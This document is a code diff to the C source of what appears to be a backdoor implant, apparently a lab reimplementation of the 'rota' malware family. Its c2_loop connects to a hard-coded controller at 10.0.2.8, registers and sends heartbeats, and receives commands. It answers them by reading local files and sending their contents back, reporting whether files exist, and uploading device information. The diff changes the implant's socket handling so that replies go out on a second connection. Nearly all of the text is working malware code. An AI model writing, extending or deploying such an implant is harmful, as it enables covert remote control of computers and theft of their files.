@@ -21,6 +21,7 @@ void c2_loop() {
 
     int sleepy_time = 3; // default C2 sleep time
     int sock;
+    int sock2;
 		bool first_pkt = true;
     //int counter;
     const char* server_name = "10.0.2.8";
@@ -36,6 +37,7 @@ void c2_loop() {
 
     // interactive c2 loop
     while (1) {
+
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         fprintf(stderr, "could not create socket\n");
         sleep(3);
@@ -50,20 +52,18 @@ void c2_loop() {
 
 
 		if (first_pkt == false) {
-						// initial pkt registration
-				char *initial_pkt = initial_rota_pkt();
+			// initial pkt registration
+			char *initial_pkt = initial_rota_pkt();
 			memcpy(&initial_pkt[14], &rota_c2_heartbeat, 4);
 			send(sock, initial_pkt, 82, 0);
+
 		} else {
-	    // initial pkt registration
 			first_pkt = false;
 			char *initial_pkt = initial_rota_pkt();
 			send(sock, initial_pkt, 82, 0);
-
 		}
 
     // interactive c2 loop
-    //while (1) {
         //int i = 0;
         printf("(%d) In c2 loop...\n", getpid());
 
@@ -77,7 +77,25 @@ void c2_loop() {
 
         memset(buffer, 0, maxlen);
 
+
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
+						//close(sock);
+						// close previous socket
+
+						// create new socket to send response
+						if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+								fprintf(stderr, "could not create socket\n");
+								sleep(3);
+								c2_loop();
+						}
+
+						if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+								fprintf(stderr, "[!] Could not connect to server...\n");
+								sleep(3);
+								c2_loop();
+						}
+
+
         maxlen -= n;
         len += n;
 
@@ -145,11 +163,11 @@ void c2_loop() {
                 fread(data, sizeof(payload[0]), stats.st_size, fd);
                 fclose(fd);
 
-                build_c2_response(data, cmd_id, sock);
+                build_c2_response(data, cmd_id, sock2);
                 free(data);
             } else {
                 char *msg = "file does not exist";
-                build_c2_response(msg, cmd_id, sock);
+                build_c2_response(msg, cmd_id, sock2);
             }
         }
         else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
@@ -188,10 +206,10 @@ void c2_loop() {
 
             if (result == true) {
                 char *msg = "file exists";
-                build_c2_response(msg, cmd_id, sock);
+                build_c2_response(msg, cmd_id, sock2);
             } else {
                 char *msg = "file does not exist";
-                build_c2_response(msg, cmd_id, sock);
+                build_c2_response(msg, cmd_id, sock2);
             }
 
         }
@@ -244,10 +262,12 @@ void c2_loop() {
         free(payload);
         free(cmd_id);
         memset(buffer, 0, strlen(buffer));
+				close(sock);
     }
 
         memset(buffer, 0, strlen(buffer));
         sleep(sleepy_time);
+				close(sock);
     }
 
     close(sock);
@@ -495,4 +515,5 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
 
     send(sock, rota_resp_pkt, (82 + buffer_len), 0);
     free(rota_resp_pkt);
+    close(sock);
 }
